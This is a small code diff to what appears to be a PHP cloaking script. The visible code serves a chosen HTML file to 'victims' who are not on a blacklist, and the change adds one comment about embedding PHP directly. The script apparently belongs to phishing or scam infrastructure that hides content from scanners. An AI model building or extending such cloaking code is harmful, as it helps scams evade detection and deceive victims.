@@ -79,6 +79,7 @@ $allowed = "- *Jedi Mind Trick Successful* -";
 
 // Content for victims to see (not on the blacklist)
 // Point this to file containing HTML you want the victims to see
+// OR, if you need to pass an ID value you may just manually put the PHP here instead of file_get_contents
 $realhtml = file_get_contents('/var/www/html/realcontent.php');
 echo $realhtml;
 
